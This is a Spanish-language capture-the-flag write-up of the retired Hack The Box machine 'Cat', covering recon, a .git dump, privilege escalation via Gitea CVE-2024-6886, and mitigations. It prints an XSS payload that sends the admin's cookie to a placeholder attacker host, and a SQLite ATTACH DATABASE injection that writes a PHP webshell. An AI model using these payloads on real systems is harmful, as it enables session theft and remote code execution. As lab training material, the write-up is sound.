---
machine: Cat
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, xss, sqli, sqlite, gitea, privesc]
---

# Cat — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un `.git` expuesto filtra el código de Cat. Un XSS en el nombre de usuario roba la cookie del admin y el parámetro de aceptar gatos es inyectable en SQLite; `ATTACH DATABASE` escribe un webshell PHP. El hash de `rosa` se crackea, la contraseña de `axel` aparece en el log de Apache y un XSS en Gitea CVE-2024-6886 exfiltra la contraseña de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` Apache con PHP.
- `feroxbuster` encuentra `join.php`, `contest.php`, `admin.php`, `winners.php` y `.git/`.
- La cookie de sesión no tiene `HttpOnly`.

## Enumeración

- `git-dumper http://cat.htb/.git src` reconstruye el repositorio.
- El código confirma que el nombre de usuario se refleja en la revisión del admin y que la aceptación de gatos concatena el ID en SQLite.
- También revela la ruta `/databases/cat.db`.

```bash
git-dumper http://cat.htb/.git cat-src
```

## Foothold

Se registra un usuario con un XSS en el nombre y se envía un gato; cuando el admin revisa la entrada, el script roba su cookie. Con esa sesión se accede a `admin.php` y al parámetro de aceptación, vulnerable a SQLi.

```text
<script>new Image().src='http://<ATTACKER>/?c='+document.cookie</script>
```

SQLite permite `ATTACH DATABASE` para crear un archivo `.php` con una tabla que contiene el webshell.

```sql
1; ATTACH DATABASE '/var/www/<FILE>.php' AS db;
CREATE TABLE db.pwn (cmd text);
INSERT INTO db.pwn VALUES ('<?php system($_GET[0]); ?>');-- -
```

## Movimiento lateral

El webshell corre como `www-data`. En `cat.db` está el hash MD5 de `rosa`, que se crackea y funciona con `su`. El log de Apache guarda la contraseña de `axel` en claro al iniciar sesión.

```bash
sqlite3 /databases/cat.db 'select * from users;'
grep 'loginPassword' /var/log/apache2/access.log
```

## Escalada de privilegios

`axel` puede acceder a la instancia privada de Gitea en `localhost:3000`. La versión es vulnerable a CVE-2024-6886: un XSS almacenado en la descripción de un repositorio se ejecuta en la sesión del admin y permite leer `index.php`, que contiene la contraseña de admin; esa misma contraseña se reutiliza para `root` con `su`.

```text
http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php
```

## Evidencia

- `.git` expuesto y código fuente.
- XSS en el nombre de usuario y cookie de admin.
- SQLi SQLite con `ATTACH DATABASE` y webshell.
- Hash de `rosa` y contraseña de `axel` en el log.
- Gitea CVE-2024-6886 y contraseña de root.

## Lecciones aprendidas

- Un `.git` accesible equivale a publicar el código y sus rutas internas.
- El XSS en un campo revisado por un admin es ejecución en su sesión.
- SQLite permite escribir archivos desde una inyección si el usuario de la base tiene permisos.
- Los logs de acceso pueden contener credenciales en la URL.

## Mitigación y detección

- Bloquear `.git`, backups y archivos de base de datos desde el webroot.
- Escapar salidas y usar cookies `HttpOnly`/`SameSite`.
- Parametrizar consultas y no permitir `ATTACH DATABASE` desde la aplicación.
- Actualizar Gitea y no registrar contraseñas en logs.

## Referencias

- [0xdf — Cat](https://0xdf.gitlab.io/2025/07/05/htb-cat.html)
- [IppSec — Cat](https://www.youtube.com/watch?v=x3UvO2DDbbA)
- [Hack The Box — Cat](https://app.hackthebox.com/machines/cat)
